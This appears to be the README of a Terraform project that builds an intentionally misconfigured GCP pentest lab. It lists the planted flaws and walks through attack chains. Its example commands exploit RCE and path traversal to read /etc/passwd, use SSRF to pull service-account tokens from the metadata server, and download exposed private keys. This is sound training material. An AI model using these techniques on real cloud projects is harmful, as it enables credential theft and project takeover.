# GCP Vulnerable Cloud Lab

> **WARNING: This repository deploys intentionally vulnerable infrastructure.**
> Use only in isolated GCP projects dedicated to security training and research.
> **Never deploy in production. Destroy resources when finished.**

A fully automated Terraform deployment of a deliberately misconfigured Google Cloud Platform environment for practising cloud penetration testing, security assessments, and red team exercises.

Based on the article: *Building a Vulnerable GCP Pentest Lab with Terraform*.

---

## Attack Surface Overview

| Resource | Vulnerability | Impact |
|---|---|---|
| **DVWA Web Server** | Open SSH (0.0.0.0/0), SA key in metadata | Initial access |
| **Cloud Function** | SSRF, RCE (`?cmd=`), env dump, path traversal | Full instance compromise |
| **Cloud Run** | Hardcoded DB credentials in env vars, no auth | Credential theft |
| **Storage Bucket** | Public read, credentials + private key exposed | Secrets exfiltration |
| **Service Account** | `roles/owner` + multiple admin roles | Full project takeover |
| **Database Server** | No public IP, MySQL bound to 0.0.0.0 | Lateral movement target |
| **Secret Manager** | Exposed SA key stored as secret | Privilege escalation |
| **Firewall** | SSH open to internet on all instances | Brute force / key reuse |

---

## Prerequisites

- [Terraform](https://developer.hashicorp.com/terraform/downloads) >= 1.0
- [Google Cloud SDK](https://cloud.google.com/sdk/docs/install) (`gcloud`)
- A GCP project with billing enabled (dedicated, isolated project recommended)
- The following APIs will be enabled automatically:
  - Compute Engine, Cloud Functions, Cloud Run, Cloud Storage
  - Secret Manager, IAM, Cloud Resource Manager, Cloud Build

---

## Quick Start

```bash
# 1. Clone the repository
git clone https://github.com/anpa1200/vulnerable-cloud-lab.git
cd vulnerable-cloud-lab

# 2. Deploy (interactive — prompts for project ID and handles auth)
bash scripts/deploy.sh

# 3. Verify all vulnerabilities are reachable
bash scripts/verify.sh

# 4. When done — DESTROY everything
bash scripts/cleanup.sh
```

---

## Manual Deployment

```bash
cd terraform

# Copy and edit variables
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars with your GCP project ID

# Authenticate
gcloud auth login
gcloud auth application-default login

# Deploy
make init
make plan
make apply

# View the attack surface summary
make output
```

### Makefile targets

| Target | Description |
|---|---|
| `make init` | `terraform init` |
| `make plan` | Create and save a plan |
| `make apply` | Apply saved plan |
| `make apply-auto` | Apply without confirmation prompt |
| `make destroy` | Destroy all resources |
| `make output` | Print the lab attack surface summary |
| `make web-ip` | Print the web server's public IP |
| `make function-url` | Print the Cloud Function URL |
| `make run-url` | Print the Cloud Run URL |
| `make bucket` | Print the vulnerable bucket name |

---

## Vulnerability Details

### 1. Cloud Function — SSRF / RCE / Env Dump / Path Traversal

The Cloud Function (`?` endpoints) exposes multiple critical vulnerabilities:

```bash
FUNC_URL=$(cd terraform && terraform output -raw cloud_function_url)

# Remote Code Execution
curl "${FUNC_URL}?cmd=id"
curl "${FUNC_URL}?cmd=cat+/etc/passwd"

# SSRF — access GCP metadata service
curl "${FUNC_URL}?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Dump all environment variables
curl "${FUNC_URL}?env=1"

# Read specific secret from env
curl "${FUNC_URL}?secret=SECRET_KEY"

# Path traversal
curl "${FUNC_URL}?file=/etc/passwd"
curl "${FUNC_URL}?file=/proc/self/environ"
```

### 2. Public Storage Bucket — Credential Exposure

```bash
BUCKET=$(cd terraform && terraform output -raw vulnerable_bucket_name)

# Read database credentials
curl "https://storage.googleapis.com/${BUCKET}/secrets/database-credentials.json"

# Download exposed private SSH key
curl "https://storage.googleapis.com/${BUCKET}/keys/id_rsa"

# List all objects (public)
gsutil ls "gs://${BUCKET}/"
```

### 3. DVWA Web Server

DVWA (Damn Vulnerable Web Application) is pre-installed and accessible at:

```
http://<WEB_SERVER_IP>/
Credentials: admin / password
```

The service account key is also embedded in the instance metadata:

```bash
# From inside a compromised instance or via SSRF
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/sa-key" \
  -H "Metadata-Flavor: Google"
```

### 4. Overprivileged Service Account

The web server runs with a service account that has `roles/owner` plus additional admin roles. Obtaining credentials (via metadata SSRF, the public bucket, or Secret Manager) grants full project control.

```bash
# After obtaining sa-key.json:
gcloud auth activate-service-account --key-file=sa-key.json
gcloud projects get-iam-policy <PROJECT_ID>
gcloud compute instances list
```

### 5. Cloud Run — Hardcoded Credentials

The Cloud Run service exposes hardcoded database credentials via environment variables, visible through the `/env` endpoint or by reading the service configuration.

---

## Attack Chains

### Chain 1: SSRF → Metadata → Project Takeover
1. Access the Cloud Function SSRF endpoint
2. Fetch the service account token from the metadata server
3. Use the token to call GCP APIs and enumerate resources
4. Escalate to full project control via the overprivileged SA

### Chain 2: Public Bucket → SA Key → Full Access
1. List objects in the public GCS bucket
2. Download `secrets/database-credentials.json` and `keys/id_rsa`
3. Activate the service account key with `gcloud auth activate-service-account`
4. Enumerate and exploit all project resources

### Chain 3: RCE → Lateral Movement → Database
1. Exploit the `?cmd=` RCE endpoint in the Cloud Function
2. Extract credentials from environment variables
3. Use internal connectivity to reach the database server on the private subnet

---

## Testing

### Configuration tests (no GCP required)

```bash
pip install pytest
pytest tests/test_terraform_config.py -v
```

### Post-deploy vulnerability tests

```bash
# After deploying the lab:
cd terraform
pytest ../tests/test_vulnerabilities.py -v
```

---

## Repository Structure

```
.
├── terraform/
│   ├── providers.tf          # Provider versions and configuration
│   ├── variables.tf          # Input variables
│   ├── main.tf               # All GCP resources (~350 lines)
│   ├── outputs.tf            # Outputs including lab_summary
│   ├── terraform.tfvars.example
│   ├── Makefile              # Convenience targets
│   └── function_code/
│       ├── main.py           # Vulnerable Cloud Function (SSRF/RCE/etc.)
│       └── requirements.txt
├── tests/
│   ├── test_terraform_config.py    # Config validation (no GCP needed)
│   └── test_vulnerabilities.py    # Live exploit verification tests
├── scripts/
│   ├── deploy.sh             # One-command deployment
│   ├── verify.sh             # Post-deploy vulnerability checks
│   └── cleanup.sh            # Safe teardown
└── README.md
```

---

## Cost Estimate

Running the full lab for one day:

| Resource | Estimated Cost |
|---|---|
| 2× e2-medium compute instances | ~$1.00/day |
| Cloud Run (minimal traffic) | ~$0.00 |
| Cloud Functions (minimal invocations) | ~$0.00 |
| Cloud Storage (< 1 MB) | ~$0.00 |
| **Total** | **~$1–2/day** |

Always run `bash scripts/cleanup.sh` when finished to avoid ongoing charges.

---

## Cleanup

```bash
# Guided cleanup (recommended)
bash scripts/cleanup.sh

# Direct Terraform destroy
cd terraform && terraform destroy -auto-approve
```

---

## Disclaimer

This lab is provided for **educational purposes only**. The intentional vulnerabilities included here should never be deployed in production environments or on systems you do not own. By using this repository you agree to use it only for authorised security training, research, and CTF/lab scenarios.

The author assumes no liability for misuse.
